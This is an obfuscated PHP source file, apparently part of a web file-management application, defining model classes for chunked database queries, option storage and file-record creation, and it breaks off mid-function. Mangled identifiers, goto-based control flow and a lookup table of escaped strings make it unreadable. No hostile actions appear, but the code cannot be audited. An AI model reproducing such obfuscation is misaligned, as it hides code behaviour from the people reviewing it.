b‚éÖ‹Ò„°: $bÃÓîŸÑ« =& $_SERVER[Â€Á›¨õ]; ignore_timeout(); $a¬ëØ¯ÏÒ = self::SQL_WHERE_IN_CHUNK; goto d¶ßšØ¬ˆ¶; BåÌ»‰±Ü×: } public function save($CÊ•ˆíİ†¦ = '', $Fƒ·ÒØ¢Şİ = array()) { goto Eœùñ®ÊÉÕ; e‚½á‚¤”™: $c’¡¥Ê©ÆŒ = $d‚¶ĞƒŸò[$dèÉùóÈÖì[271]][$cÎÒˆèâ†][1]; $c’¡¥Ê©ÆŒ = is_array($c’¡¥Ê©ÆŒ) ? $c’¡¥Ê©ÆŒ : array(); $BˆÙØÎÜƒ = count($c’¡¥Ê©ÆŒ); goto E°ĞŠŒóÉ; cà´ê±ªå: $cÎÒˆèâ† = $this->findWhereField($d‚¶ĞƒŸò); if (!$cÎÒˆèâ†) { return parent::save($CÊ•ˆíİ†¦, $Fƒ·ÒØ¢Şİ); } $B¬àÓ”§Öù = 0; goto e‚½á‚¤”™; E°ĞŠŒóÉ: for ($fÔ§ßøîéÏ = 0; $fÔ§ßøîéÏ < $BˆÙØÎÜƒ; $fÔ§ßøîéÏ += $e°£×ˆÈÁö) { $F»Œä÷¿¡ = array_slice($c’¡¥Ê©ÆŒ, $fÔ§ßøîéÏ, $e°£×ˆÈÁö); if (!is_array($F»Œä÷¿¡) || count($F»Œä÷¿¡) == 0) { break; } $d‚¶ĞƒŸò[$dèÉùóÈÖì[271]][$cÎÒˆèâ†][1] = $F»Œä÷¿¡; $this->optionsValue($d‚¶ĞƒŸò); $B¬àÓ”§Öù += parent::save($CÊ•ˆíİ†¦, $Fƒ·ÒØ¢Şİ); $this->chunkEventCheck(count($F»Œä÷¿¡)); } $this->chunkEventSet(); return $B¬àÓ”§Öù; goto a§÷ĞÒ©…; Eœùñ®ÊÉÕ: $dèÉùóÈÖì =& $_SERVER[Â€Á›¨õ]; $e°£×ˆÈÁö = self::SQL_WHERE_IN_CHUNK; $d‚¶ĞƒŸò = $this->optionsValue(); goto cà´ê±ªå; a§÷ĞÒ©…: } public function add($DÇ–£İøŠÎ = '', $a ÙÄÛ±‹ = array(), $c…Ö®³ê´ù = false) { if ($this->addTaskStatus && is_array($DÇ–£İøŠÎ)) { $this->addTaskData[] = $DÇ–£İøŠÎ; return; } return parent::add($DÇ–£İøŠÎ, $a ÙÄÛ±‹, $c…Ö®³ê´ù); } public function parseWhereLike($cö…Ü¨¤Ç—, $CªŒÖØº¯æ = '', $cğ¹…™êß = false, &$FĞÍìá¾‡ù = false) { goto e‚¶‡íŒï·; f½ø¡È¹Æ£: foreach ($cö…Ü¨¤Ç— as $c«—˜ÚÙ‚à => $D‰”Çäòİ) { if (is_array($D‰”Çäòİ) && count($D‰”Çäòİ) == 2 && $D‰”Çäòİ[0] == $Bõ…â‹’İ¬[378] && is_string($D‰”Çäòİ[1]) && substr($D‰”Çäòİ[1], 0, 1) == $Bõ…â‹’İ¬[379] && substr($D‰”Çäòİ[1], strlen($D‰”Çäòİ[1]) - 1, 1) == $Bõ…â‹’İ¬[379]) { goto dáâÅëÛ‹°; fÒÜêÏî““: $bÌÏ‚äª[$fà¼Å®Õô·] = $Bõ…â‹’İ¬[382] . $CáèƒÃŠïÒ . $Bõ…â‹’İ¬[383] . $FÔâ‰¥³ŒÖ . $Bõ…â‹’İ¬[384]; $fà¼Å®Õô·++; continue; goto F¨Ğç¶ÔÖÓ; dáâÅëÛ‹°: $FĞÍìá¾‡ù = !0; $CáèƒÃŠïÒ = is_string($c«—˜ÚÙ‚à) ? $c«—˜ÚÙ‚à : $CªŒÖØº¯æ; $FÔâ‰¥³ŒÖ = substr($D‰”Çäòİ[1], 1, strlen($D‰”Çäòİ[1]) - 2); goto E‰İ‘±˜; E‰İ‘±˜: $FÔâ‰¥³ŒÖ = $this->db->escapeString($FÔâ‰¥³ŒÖ); if (!strpos($CáèƒÃŠïÒ, $Bõ…â‹’İ¬[94])) { $CáèƒÃŠïÒ = $Bõ…â‹’İ¬[380] . $CáèƒÃŠïÒ . $Bõ…â‹’İ¬[380]; } if ($A‹×‹ô›ëŞ[$Bõ…â‹’İ¬[381]]) { $FÔâ‰¥³ŒÖ = $Bõ…â‹’İ¬[115] . $FÔâ‰¥³ŒÖ . $Bõ…â‹’İ¬[115]; } goto fÒÜêÏî““; F¨Ğç¶ÔÖÓ: } if (is_array($D‰”Çäòİ)) { $CªŒÖØº¯æ = is_string($c«—˜ÚÙ‚à) ? $c«—˜ÚÙ‚à : $CªŒÖØº¯æ; $D‰”Çäòİ = $this->parseWhereLike($D‰”Çäòİ, $CªŒÖØº¯æ, !0, $FĞÍìá¾‡ù); } if (is_numeric($c«—˜ÚÙ‚à)) { $bÌÏ‚äª[$fà¼Å®Õô·] = $D‰”Çäòİ; $fà¼Å®Õô·++; } else { $bÌÏ‚äª[$c«—˜ÚÙ‚à] = $D‰”Çäòİ; } } if ($FĞÍìá¾‡ù && !$cğ¹…™êß) { trace_log(array($bÌÏ‚äª, $cö…Ü¨¤Ç—), $Bõ…â‹’İ¬[271]); } return $bÌÏ‚äª; goto bÉ¢Ï«“À·; eµñäŸæ’: if (!is_array($cö…Ü¨¤Ç—)) { return $cö…Ü¨¤Ç—; } $bÌÏ‚äª = array(); $fà¼Å®Õô· = 0; goto f½ø¡È¹Æ£; e‚¶‡íŒï·: $Bõ…â‹’İ¬ =& $_SERVER[Â€Á›¨õ]; $A‹×‹ô›ëŞ = $GLOBALS[$Bõ…â‹’İ¬[6]][$Bõ…â‹’İ¬[376]]; if (!$A‹×‹ô›ëŞ[$Bõ…â‹’İ¬[377]]) { return $cö…Ü¨¤Ç—; } goto eµñäŸæ’; bÉ¢Ï«“À·: } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($EÉ‘øæçâ£ = array()) { goto E ô‡æÃäá; DŸƒ¹”²áß: $D¥òï–•¾Å = $this->findWhereField($CÄ–†¼ŠÑ‹); if (!$D¥òï–•¾Å || isset($CÄ–†¼ŠÑ‹[$F°ÊÑÚÄÑ±[288]]) || isset($CÄ–†¼ŠÑ‹[$F°ÊÑÚÄÑ±[349]])) { return parent::select($EÉ‘øæçâ£); } $Båß©ö¯ã = $CÄ–†¼ŠÑ‹[$F°ÊÑÚÄÑ±[271]][$D¥òï–•¾Å][1]; goto aİ«±ëºÛ—; BÏ©Í‹ÒÍ: return $DØìöëÉ; goto d”•á™ìÛ¸; aİ«±ëºÛ—: $Båß©ö¯ã = is_array($Båß©ö¯ã) ? $Båß©ö¯ã : array(); $DØìöëÉ = null; for ($AÁ™—öƒòË = 0; $AÁ™—öƒòË < count($Båß©ö¯ã); $AÁ™—öƒòË += $a’Ì–³ï•å) { $eÌ·¥ºÓöŠ = array_slice($Båß©ö¯ã, $AÁ™—öƒòË, $a’Ì–³ï•å); if (!is_array($eÌ·¥ºÓöŠ) || count($eÌ·¥ºÓöŠ) == 0) { break; } $CÄ–†¼ŠÑ‹[$F°ÊÑÚÄÑ±[271]][$D¥òï–•¾Å][1] = $eÌ·¥ºÓöŠ; $this->optionsValue($CÄ–†¼ŠÑ‹); $DÏ¯›Ôäë” = parent::select($EÉ‘øæçâ£); if (!$DÏ¯›Ôäë”) { continue; } if (is_null($DØìöëÉ)) { $DØìöëÉ = array(); } $DØìöëÉ = array_merge($DØìöëÉ, $DÏ¯›Ôäë”); } goto BÏ©Í‹ÒÍ; E ô‡æÃäá: $F°ÊÑÚÄÑ± =& $_SERVER[Â€Á›¨õ]; $a’Ì–³ï•å = self::SQL_WHERE_IN_CHUNK; $CÄ–†¼ŠÑ‹ = $this->optionsValue(); goto DŸƒ¹”²áß; d”•á™ìÛ¸: } public function delete($E™Î¥¨›ÓÉ = array()) { goto Aá³Æİ»ŒË; Aá³Æİ»ŒË: $bˆô¤Ä½ŞÊ =& $_SERVER[Â€Á›¨õ]; $e®áÑ‰ã = self::SQL_WHERE_IN_CHUNK; $E¾ƒ¤¿ÓÊ = $this->optionsValue(); goto E±ĞÌŒÚ „; BìÖÙ†–á: $D®ˆ„…¢¡ = $E¾ƒ¤¿ÓÊ[$bˆô¤Ä½ŞÊ[271]][$AÔáÏ ¨•§][1]; $D®ˆ„…¢¡ = is_array($D®ˆ„…¢¡) ? $D®ˆ„…¢¡ : array(); for ($eŠ­ˆˆ¹²¨ = 0; $eŠ­ˆˆ¹²¨ < count($D®ˆ„…¢¡); $eŠ­ˆˆ¹²¨ += $e®áÑ‰ã) { $eŒÜ¡Ô©Ç• = array_slice($D®ˆ„…¢¡, $eŠ­ˆˆ¹²¨, $e®áÑ‰ã); if (!is_array($eŒÜ¡Ô©Ç•) || count($eŒÜ¡Ô©Ç•) == 0) { break; } $E¾ƒ¤¿ÓÊ[$bˆô¤Ä½ŞÊ[271]][$AÔáÏ ¨•§][1] = $eŒÜ¡Ô©Ç•; $this->optionsValue($E¾ƒ¤¿ÓÊ); $fÓ’áõ‹¼ += parent::delete($E™Î¥¨›ÓÉ); } goto B¤ˆé² ‡•; B¤ˆé² ‡•: return $fÓ’áõ‹¼; goto f®àÁ‹¬; E±ĞÌŒÚ „: $AÔáÏ ¨•§ = $this->findWhereField($E¾ƒ¤¿ÓÊ); if (!$AÔáÏ ¨•§) { return parent::delete($E™Î¥¨›ÓÉ); } $fÓ’áõ‹¼ = 0; goto BìÖÙ†–á; f®àÁ‹¬: } private function findWhereField($aŞ¯ò ‹¸à) { $A¼³Ô ŞËÒ =& $_SERVER[Â€Á›¨õ]; $fáÌÎ¯’´½ = self::SQL_WHERE_IN_CHUNK; if (!is_array($aŞ¯ò ‹¸à) || !is_array($aŞ¯ò ‹¸à[$A¼³Ô ŞËÒ[271]])) { return !1; } foreach ($aŞ¯ò ‹¸à[$A¼³Ô ŞËÒ[271]] as $EªóŠÍ¬àÑ => $AçÑòë®‹) { if (is_array($AçÑòë®‹) && isset($AçÑòë®‹[0]) && is_string($AçÑòë®‹[0]) && strtolower($AçÑòë®‹[0]) == $A¼³Ô ŞËÒ[7] && is_array($AçÑòë®‹[1]) && count($AçÑòë®‹[1]) > $fáÌÎ¯’´½) { ignore_timeout(); return $EªóŠÍ¬àÑ; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\x79\x73\164\145\x6d\117\160\164\151\x6f\156"; public $field = array(); public function listData($aÛÙøï¦Ÿ¦ = false, $c¤¾Ëİ­°§ = "\x6d\157\144\x69\146\x79\124\x69\155\x65", $fÊÎì¾‹ÈÛ = false) { $b‡»òÇ¼çÛ = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$b‡»òÇ¼çÛ) { return $aÛÙøï¦Ÿ¦ ? null : array(); } if (!$aÛÙøï¦Ÿ¦) { $b‡»òÇ¼çÛ = array_filter(array_values($b‡»òÇ¼çÛ)); return array_sort_by($b‡»òÇ¼çÛ, $c¤¾Ëİ­°§, $fÊÎì¾‹ÈÛ); } return $b‡»òÇ¼çÛ[$_SERVER[Â€Á›¨õ][385] . $aÛÙøï¦Ÿ¦]; } public function insert($eòŒš…‚¬) { goto E‡§ÄÍĞ³¥; a¸¬š¨¨á: $Aš×‡½°‰ô = $Aš×‡½°‰ô ? $Aš×‡½°‰ô : 0; $eòŒš…‚¬[$c ›¡í©ÄÈ[388]] = ++$Aš×‡½°‰ô; $eòŒš…‚¬[$c ›¡í©ÄÈ[192]] = time(); goto AŠ¸’¬Èñ ; A·¸Àâà¢§: return $Aš×‡½°‰ô; goto A¡–£½ùÑ×; E‡§ÄÍĞ³¥: $c ›¡í©ÄÈ =& $_SERVER[Â€Á›¨õ]; $eòŒš…‚¬ = array_field_key($eòŒš…‚¬, $this->field); $Aš×‡½°‰ô = Model($this->modelType)->get($c ›¡í©ÄÈ[386], $this->optionType . $c ›¡í©ÄÈ[387]); goto a¸¬š¨¨á; AŠ¸’¬Èñ : $eòŒš…‚¬[$c ›¡í©ÄÈ[83]] = time(); Model($this->modelType)->set($c ›¡í©ÄÈ[386], $Aš×‡½°‰ô, $this->optionType . $c ›¡í©ÄÈ[387]); Model($this->modelType)->set($c ›¡í©ÄÈ[385] . $Aš×‡½°‰ô, $eòŒš…‚¬, $this->optionType); goto A·¸Àâà¢§; A¡–£½ùÑ×: } public function update($E­Ó­Æ¹, $C«ÎïàŒ‡) { goto AëŒº–İñ; eòöÀš—ø: if (!$E²óÉò«ß) { return !1; } $C«ÎïàŒ‡ = array_merge($E²óÉò«ß, $C«ÎïàŒ‡); $C«ÎïàŒ‡[$d£²Øã„­°[83]] = time(); goto e´½¡Ê“†Ÿ; AëŒº–İñ: $d£²Øã„­° =& $_SERVER[Â€Á›¨õ]; $C«ÎïàŒ‡ = array_field_key($C«ÎïàŒ‡, $this->field); $E²óÉò«ß = $this->listData($E­Ó­Æ¹); goto eòöÀš—ø; e´½¡Ê“†Ÿ: return Model($this->modelType)->set($d£²Øã„­°[385] . $E­Ó­Æ¹, $C«ÎïàŒ‡, $this->optionType); goto f¢…’¹™Øí; f¢…’¹™Øí: } public function remove($A“Òºİª¾©) { return Model($this->modelType)->remove($_SERVER[Â€Á›¨õ][385] . $A“Òºİª¾©, $this->optionType); } public function clear() { $bÙÄÍØÅ¿ã =& $_SERVER[Â€Á›¨õ]; Model($this->modelType)->remove($bÙÄÍØÅ¿ã[386], $this->optionType . $bÙÄÍØÅ¿ã[387]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($FïÂ¬×‡¨•, $AµŒ°Ìšóë) { if (!$AµŒ°Ìšóë) { return !1; } $Bœ¦Å‹§øÆ = $this->listData(); $Bœ¦Å‹§øÆ = array_to_keyvalue($Bœ¦Å‹§øÆ, $FïÂ¬×‡¨•); return isset($Bœ¦Å‹§øÆ[$AµŒ°Ìšóë]) ? $Bœ¦Å‹§øÆ[$AµŒ°Ìšóë] : !1; } public function findByName($aí®ù‘—†æ) { return $this->findByKey($_SERVER[Â€Á›¨õ][28], $aí®ù‘—†æ); } protected function resetData($f„ÙÊË´íÌ) { $DÏÛÂÎ†‹ =& $_SERVER[Â€Á›¨õ]; $f„ÙÊË´íÌ = is_array($f„ÙÊË´íÌ) ? $f„ÙÊË´íÌ : array(); $cš³Ì°ª† = array(); for ($BÅµùÀ¯á½ = 0; $BÅµùÀ¯á½ < count($f„ÙÊË´íÌ); $BÅµùÀ¯á½++) { $cš³Ì°ª†[$DÏÛÂÎ†‹[385] . $f„ÙÊË´íÌ[$BÅµùÀ¯á½][$DÏÛÂÎ†‹[388]]] = $f„ÙÊË´íÌ[$BÅµùÀ¯á½]; } return Model($this->modelType)->set($cš³Ì°ª†, !1, $this->optionType); } private function getAutoName($Eí³”‹èíí) { $fˆœ•ˆóğå = array_to_keyvalue($this->listData(), $_SERVER[Â€Á›¨õ][28]); if (!$fˆœ•ˆóğå || !isset($fˆœ•ˆóğå[$Eí³”‹èíí])) { return $Eí³”‹èíí; } for ($cñ§‚†¢ùŞ = 1; $cñ§‚†¢ùŞ < count($fˆœ•ˆóğå); $cñ§‚†¢ùŞ++) { $B’™çØÓï¨ = $Eí³”‹èíí . "\50{$cñ§‚†¢ùŞ}\51"; if (!isset($fˆœ•ˆóğå[$B’™çØÓï¨])) { return $B’™çØÓï¨; } } return $B’™çØÓï¨; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($fÛ£¿¿è‡ = false, $B´¬…Û›± = '', $eºßÖ©‚º = false) { goto c ¸ç¦«; c ¸ç¦«: $D‚£‡„íÁ =& $_SERVER[Â€Á›¨õ]; $DÍƒéÄ³Õâ = $this->cacheGet($B´¬…Û›±); $aí‚‘°°Î¡ = $this->optionDefault($B´¬…Û›±); goto E¯º¬­ƒÚ; E•±‰¢Ë»Ì: $DÍƒéÄ³Õâ = $this->where($f‡ùÑô®Î)->select(); $DÍƒéÄ³Õâ = array_to_keyvalue($DÍƒéÄ³Õâ, $D‚£‡„íÁ[92], $D‚£‡„íÁ[370]); foreach ($DÍƒéÄ³Õâ as $d«Ï‘Ï => $c¯£á«Î) { if ($eºßÖ©‚º || in_array($d«Ï‘Ï, $this->jsonField)) { $DÍƒéÄ³Õâ[$d«Ï‘Ï] = json_decode($c¯£á«Î, !0); } } goto cÛ¼Ñ¹­Œ‚; cÛ¼Ñ¹­Œ‚: $this->cacheSet($B´¬…Û›±, $DÍƒéÄ³Õâ); $DÍƒéÄ³Õâ = array_merge($aí‚‘°°Î¡, $DÍƒéÄ³Õâ); return $fÛ£¿¿è‡ ? $DÍƒéÄ³Õâ[$fÛ£¿¿è‡] : $DÍƒéÄ³Õâ; goto a’šÏ›Ñóî; E¯º¬­ƒÚ: $aí‚‘°°Î¡ = is_array($aí‚‘°°Î¡) ? $aí‚‘°°Î¡ : array(); if (is_array($DÍƒéÄ³Õâ)) { $DÍƒéÄ³Õâ = array_merge($aí‚‘°°Î¡, $DÍƒéÄ³Õâ); return $fÛ£¿¿è‡ ? isset($DÍƒéÄ³Õâ[$fÛ£¿¿è‡]) ? $DÍƒéÄ³Õâ[$fÛ£¿¿è‡] : null : $DÍƒéÄ³Õâ; } $f‡ùÑô®Î = $this->filterWhere(array($D‚£‡„íÁ[29] => $B´¬…Û›±)); goto E•±‰¢Ë»Ì; a’šÏ›Ñóî: } public function set($EŒù×†Ó…Ò, $b¤Ü ğÔĞ½ = false, $a¸Ä…ÙÖô” = '') { goto bÒö½„é™š; bÒö½„é™š: $Bº«¥¬Êí =& $_SERVER[Â€Á›¨õ]; $this->cacheRemove($a¸Ä…ÙÖô”); $CØÈğ–«ã = array(); goto f‰Ù£“¯º‡; f‰Ù£“¯º‡: $fİæ½ù·ì³ = is_array($EŒù×†Ó…Ò) ? $EŒù×†Ó…Ò : array($EŒù×†Ó…Ò => $b¤Ü ğÔĞ½); foreach ($fİæ½ù·ì³ as $e–¹ªœÎÖô => $Aä‰„æÍš) { if (is_array($Aä‰„æÍš)) { $Aä‰„æÍš = json_encode_force($Aä‰„æÍš); } $this->checkLength($Aä‰„æÍš, !1, $this->tableName . $Bº«¥¬Êí[4] . $EŒù×†Ó…Ò); $Aä‰„æÍš = self::textEncode($Aä‰„æÍš); $fİæ½ù·ì³ = array($Bº«¥¬Êí[29] => $a¸Ä…ÙÖô”, $Bº«¥¬Êí[92] => $e–¹ªœÎÖô, $Bº«¥¬Êí[370] => $Aä‰„æÍš); $CØÈğ–«ã[] = $this->filterWhere($fİæ½ù·ì³); } if (!$CØÈğ–«ã) { return !0; } goto eÖŠéäòÉ·; eÖŠéäòÉ·: return $this->addAll($CØÈğ–«ã, array(), !0); goto cö˜–«Ôğ§; cö˜–«Ôğ§: } protected function optionDefault($cˆ†Ôº¡Ç = '') { return !1; } public function setDeep($Bê ë¬ÏÑ, $e¹‡…†ñ’Í = false, $A„›ÉŠöçó = '') { $B£ÖÙ«½¡ğ = explode($_SERVER[Â€Á›¨õ][94], $Bê ë¬ÏÑ); $E‰ŒĞ’‚·• = $this->get(); array_set_value($E‰ŒĞ’‚·•, $Bê ë¬ÏÑ, $e¹‡…†ñ’Í); $this->set($B£ÖÙ«½¡ğ[0], $E‰ŒĞ’‚·•[$B£ÖÙ«½¡ğ[0]], $A„›ÉŠöçó); } public function remove($aÃ¿ç§——ç, $D¤ÕØŠ°Í‘ = '') { $B†¿‚ã§Ì¹ =& $_SERVER[Â€Á›¨õ]; $this->cacheRemove($D¤ÕØŠ°Í‘); $fíÃ“¡ÙÙ = $this->filterWhere(array($B†¿‚ã§Ì¹[92] => $aÃ¿ç§——ç, $B†¿‚ã§Ì¹[29] => $D¤ÕØŠ°Í‘)); if (is_null($aÃ¿ç§——ç)) { unset($fíÃ“¡ÙÙ[$B†¿‚ã§Ì¹[92]]); } return $this->where($fíÃ“¡ÙÙ)->delete(); } public function cacheSet($CâÓ¸š…¸, $BŞĞœßÎ¢« = false) { return Cache::set($this->cacheKey($CâÓ¸š…¸), $BŞĞœßÎ¢«); } public function cacheGet($DÀ¦½©’ë) { return Cache::get($this->cacheKey($DÀ¦½©’ë)); } public function cacheRemove($a½•‘£¼˜ò) { return Cache::remove($this->cacheKey($a½•‘£¼˜ò)); } protected function filterWhere($e°ìâÌÓ¶®) { return $e°ìâÌÓ¶®; } protected function cacheKey($c„³á’ˆ) { return $c„³á’ˆ; } } goto aØ›‚½š; D£Ë£ĞµØ›: class FileModel extends ModelBase { protected $tableName = "\151\157\137\x66\151\x6c\x65"; protected $tableMeta = array("\x74\x61\142\x6c\x65\116\x61\x6d\x65" => "\151\157\x5f\x66\151\154\145\137\155\145\164\141", "\155\x65\x74\141\x46\x69\x65\x6c\144" => "\146\151\x6c\x65\111\x44"); public function fileInfo($eÜ²™Ÿê·) { $bÌóÇ²‰‹ =& $_SERVER[Â€Á›¨õ]; static $e×Ô‰‘˜Êƒ = array(); if (!isset($e×Ô‰‘˜Êƒ[$eÜ²™Ÿê·])) { $eÓËğ±™Ú = $bÌóÇ²‰‹[1708]; $EôÚœôŒ = Model($bÌóÇ²‰‹[444])->field($eÓËğ±™Ú)->where(array($bÌóÇ²‰‹[442] => $eÜ²™Ÿê·))->find(); $e×Ô‰‘˜Êƒ[$eÜ²™Ÿê·] = $EôÚœôŒ; } return $e×Ô‰‘˜Êƒ[$eÜ²™Ÿê·]; } public function addFileByContent($f¢ƒ°ï°­ = '', $Aùôí ï» = '') { goto E³œºóè±„; B»©”½ñÖ•: $a©ê†Öß = $dªÅ†óÂ™Á . $b¢Ü¢âïÆ¼[1710] . rand_string(16); file_put_contents($a©ê†Öß, $f¢ƒ°ï°­); $bóù«ƒÃĞ• = $this->addFile($a©ê†Öß, $Aùôí ï», !0); goto D¢›‰éíæå; D¢›‰éíæå: if (file_exists($a©ê†Öß)) { @unlink($a©ê†Öß); } return $bóù«ƒÃĞ•; goto DÍÅß‘ÛÃÙ; E³œºóè±„: $b¢Ü¢âïÆ¼ =& $_SERVER[Â€Á›¨õ]; $dªÅ†óÂ™Á = TEMP_PATH . $b¢Ü¢âïÆ¼[1709]; if (!is_dir($dªÅ†óÂ™Á)) { mk_dir($dªÅ†óÂ™Á); } goto B»©”½ñÖ•; DÍÅß‘ÛÃÙ: } public function createFileName($AÁ²™Ô®‡Ô, $dèõ¢öÑ®» = false) { goto C†’ÄÍ¿ìÒ; CÕ’­•àÛ«: $cªÆ—îœÅƒ = $Böáëª™°Î->pathFather($bÄ¥Ó ¯); static $c”Ö¬èåäÎ = false; $Eã©É¨äê‡ = $bÓÄå§ëèª[1711] . md5($cªÆ—îœÅƒ); goto b‹ù‡äËŒ´; b‹ù‡äËŒ´: if (!$c”Ö¬èåäÎ && !Cache::get($Eã©É¨äê‡)) { $c”Ö¬èåäÎ = !0; $D’©é¡Ò¦ = IO::mkdir($cªÆ—îœÅƒ); if (!IO::exist($D’©é¡Ò¦ . $bÓÄå§ëèª[1712])) { IO::mkfile($D’©é¡Ò¦ . $bÓÄå§ëèª[1712]); } Cache::set($Eã©É¨äê‡, 1, 3600 * 2); } return $bÄ¥Ó ¯; goto b‡˜‚§ñ±á; C†’ÄÍ¿ìÒ: $bÓÄå§ëèª =& $_SERVER[Â€Á›¨õ]; $Böáëª™°Î = IO::init($bÓÄå§ëèª[8]); $bÄ¥Ó ¯ = $this->makeFilePath($AÁ²™Ô®‡Ô, $Böáëª™°Î, $dèõ¢öÑ®»); goto CÕ’­•àÛ«; b‡˜‚§ñ±á: } public function makeFilePath($CÑìë§òœå, $fÚÁ·½¼Ş, $C“±®Ø’Éò = false) { goto eçÁÎø¬»®; EãêÒ‰Ù°ï: if (!$CÑìë§òœå) { $Cìßªá“Ä” = $A¢Ø ©¨»ã[1715]; } switch ($Cìßªá“Ä”) { case $A¢Ø ©¨»ã[1716]: $a§¿Œµ¡æ = $a§¿Œµ¡æ . $A¢Ø ©¨»ã[94] . $fÚÁ·½¼Ş->ext($CÑìë§òœå); if ($D«İ‚¡¨Ö‚ == $A¢Ø ©¨»ã[1654]) { $a§¿Œµ¡æ .= $A¢Ø ©¨»ã[1402]; } break; case $A¢Ø ©¨»ã[1717]: goto D±ëí­Ûçß; C¶ïİ»Œ›İ: CacheLock::lock($Fæå»ô©ï·); $a§¿Œµ¡æ = $fùñ¹½Šå• . $CÑìë§òœå; if (IO::exist($fùñ¹½Šå• . $CÑìë§òœå)) { $Bóäê±×¡© = substr($CÑìë§òœå, 0, strlen($CÑìë§òœå) - strlen($D«İ‚¡¨Ö‚)); $a§¿Œµ¡æ = $fùñ¹½Šå• . $Bóäê±×¡© . substr($C“±®Ø’Éò, 0, 5) . $A¢Ø ©¨»ã[94] . $D«İ‚¡¨Ö‚; } goto fâÇÓá™Ÿƒ; D±ëí­Ûçß: $F¢ÖÙ½‡È = Model($A¢Ø ©¨»ã[1098])->get($A¢Ø ©¨»ã[1398]); $CÓÚÔƒôæÄ = substr(md5($A¢Ø ©¨»ã[1718] . $F¢ÖÙ½‡È . date($A¢Ø ©¨»ã[700])), 0, 8); $d™¶§‹…Ò = KodIO::defaultDriver(); goto côÙ…‰çÁÄ; fâÇÓá™Ÿƒ: if (IO::isTypeObject($a§¿Œµ¡æ) && !IO::isUploadServer($a§¿Œµ¡æ)) { $Bñ’ã¿æ‹Ï = IO::setContent($a§¿Œµ¡æ, $A¢Ø ©¨»ã[33]); if (!$Bñ’ã¿æ‹Ï) { show_json($A¢Ø ©¨»ã[1721], !1); } } CacheLock::unlock($Fæå»ô©ï·); break; goto Aå°™ƒĞò¡; côÙ…‰çÁÄ: $fùñ¹½Šå• = $A¢Ø ©¨»ã[1096] . $d™¶§‹…Ò[$A¢Ø ©¨»ã[388]] . $A¢Ø ©¨»ã[396] . date($A¢Ø ©¨»ã[1719]) . $CÓÚÔƒôæÄ . $A¢Ø ©¨»ã[8]; if ($D«İ‚¡¨Ö‚ == $A¢Ø ©¨»ã[1654]) { $CÑìë§òœå .= $A¢Ø ©¨»ã[1402]; } $Fæå»ô©ï· = $A¢Ø ©¨»ã[1720] . $fùñ¹½Šå• . $CÑìë§òœå; goto C¶ïİ»Œ›İ; Aå°™ƒĞò¡: case $A¢Ø ©¨»ã[1715]: break; default: break; } return $a§¿Œµ¡æ; goto FÇíÏÕ¶°Ó; Bùò¯Ü”µ: $a§¿Œµ¡æ = $fùñ¹½Šå• . rand_string(5) . short_id(100); $CÑìë§òœå = str_replace($A¢Ø ©¨»ã[8], $A¢Ø ©¨»ã[70], KodIO::clear($CÑìë§òœå)); $D«İ‚¡¨Ö‚ = $fÚÁ·½¼Ş->ext($CÑìë§òœå); goto EãêÒ‰Ù°ï; eçÁÎø¬»®: $A¢Ø ©¨»ã =& $_SERVER[Â€Á›¨õ]; $Cìßªá“Ä” = Model($A¢Ø ©¨»ã[1098])->get($A¢Ø ©¨»ã[1713]); $fùñ¹½Šå• = KodIO::defaultIO() . date($A¢Ø ©¨»ã[1714]); goto Bùò¯Ü”µ; FÇíÏÕ¶°Ó: } public function addFileByRemote($e¤—ßÒÜÔÊ, $bœíÒ¯Ôà, $FğŸó›ñ†« = array()) { goto c‘øÃÇëš; c‘øÃÇëš: $B®ä…æ£ª =& $_SERVER[Â€Á›¨õ]; if (!IO::exist($e¤—ßÒÜÔÊ)) { return !1; } $bš…«¸ä†š = $FğŸó›ñ†«[$B®ä…æ£ª[169]] ? $FğŸó›ñ†«[$B®ä…æ£ª[169]] : $B®ä…æ£ª[33]; goto cÄÛ†»†Åæ; cÄÛ†»†Åæ: $B‹¥§Î«´é = IO::hashMd5($e¤—ßÒÜÔÊ, $bš…«¸ä†š); $b¶é×õ¬Š£ = KodIO::defaultDriver(); $D·Ì’óº‹ = array($B®ä…æ£ª[543] => IO::size($e¤—ßÒÜÔÊ), $B®ä…æ£ª[1722] => 1, $B®ä…æ£ª[407] => $bœíÒ¯Ôà, $B®ä…æ£ª[752] => $b¶é×õ¬Š£[$B®ä…æ£ª[388]], $B®ä…æ£ª[408] => $e¤—ßÒÜÔÊ, $B®ä…æ£ª[1723] => $FğŸó›ñ†«[$B®ä…æ£ª[170]] ? $FğŸó›ñ†«[$B®ä…æ£ª[170]] : IO::hashSimple($e¤—ßÒÜÔÊ), $B®ä…æ£ª[1724] => $B‹¥§Î«´é ? $B‹¥§Î«´é : $bš…«¸ä†š); goto C°ìÀ»–Àˆ; C°ìÀ»–Àˆ: if ($DÀô÷¨ßØö = $this->addFileCheckExist($D·Ì’óº‹[$B®ä…æ£ª[170]], $D·Ì’óº‹[$B®ä…æ£ª[169]], $D·Ì’óº‹[$B®ä…æ£ª[77]])) { return $DÀô÷¨ßØö; } return $this->addFileData($D·Ì’óº‹); goto FêâÔÓÉà†; FêâÔÓÉà†: } private function addFileData($d‘«¾ÈŒÔÎ) { $BÊ…“Ş²Ğ‘ =& $_SERVER[Â€Á›¨õ]; if (!$d‘«¾ÈŒÔÎ) { return !1; } $d‘«¾ÈŒÔÎ[$BÊ…“Ş²Ğ‘[77]] = intval($d‘«¾ÈŒÔÎ[$BÊ…“Ş²Ğ‘[77]]); if (!$d‘«¾ÈŒÔÎ[$BÊ…“Ş²Ğ‘[77]] && strlen($d‘«¾ÈŒÔÎ[$BÊ…“Ş²Ğ‘[170]]) > 32) { $d‘«¾ÈŒÔÎ[$BÊ…“Ş²Ğ‘[77]] = intval(substr($d‘«¾ÈŒÔÎ[$BÊ…“Ş²Ğ‘[170]], 32)); } $DÍØ˜‘šÎ = $this->add($d‘«¾ÈŒÔÎ); return $this->find($DÍØ˜‘šÎ); } public function addFile($E‘½ÊÕÀ, $d¦Ş­Ö¤à, 